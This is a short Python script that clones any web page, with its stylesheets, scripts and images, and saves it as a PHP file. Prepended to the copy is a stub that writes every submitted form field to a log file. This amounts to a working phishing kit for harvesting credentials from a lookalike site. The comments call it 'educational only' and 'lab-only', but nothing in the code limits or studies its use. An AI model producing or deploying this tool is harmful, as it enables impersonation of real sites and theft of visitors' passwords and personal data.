import os
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

def clone_webpage(url, output_dir="cloned_page"):
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    # Fetch main page
    response = requests.get(url)
    if response.status_code != 200:
        print(f"Failed to fetch {url}")
        return

    soup = BeautifulSoup(response.text, "html.parser")

    # Function to download assets
    def download_file(full_url, folder):
        parsed_url = urlparse(full_url)
        filename = os.path.basename(parsed_url.path)
        if not filename:
            return None
        filepath = os.path.join(output_dir, folder, filename)
        if not os.path.exists(os.path.join(output_dir, folder)):
            os.makedirs(os.path.join(output_dir, folder))
        try:
            r = requests.get(full_url, timeout=10)
            if r.status_code == 200:
                with open(filepath, "wb") as f:
                    f.write(r.content)
                return os.path.join(folder, filename)
        except Exception as e:
            print(f"Could not download {full_url}: {e}")
        return None

    # Download CSS, JS, Images
    for tag, attr, folder in [
        ("link", "href", "css"),
        ("script", "src", "js"),
        ("img", "src", "images"),
    ]:
        for element in soup.find_all(tag):
            file_url = element.get(attr)
            if not file_url:
                continue
            full_url = urljoin(url, file_url)
            local_path = download_file(full_url, folder)
            if local_path:
                element[attr] = local_path

    # PHP logger stub (educational only!)
    php_logger = """<?php
if (!empty($_POST) || !empty($_GET)) {
    $data = date("Y-m-d H:i:s") . " - " . json_encode($_REQUEST) . "\\n";
    file_put_contents("log.txt", $data, FILE_APPEND);
}
?>\n
"""

    # Save as PHP file (instead of HTML)
    with open(os.path.join(output_dir, "index.php"), "w", encoding="utf-8") as f:
        f.write(php_logger + str(soup))

    print(f"Webpage cloned and saved as PHP in '{output_dir}' (with lab-only logger).")


if __name__ == "__main__":
    target_url = input("Enter the URL of the webpage: ")
    clone_webpage(target_url)
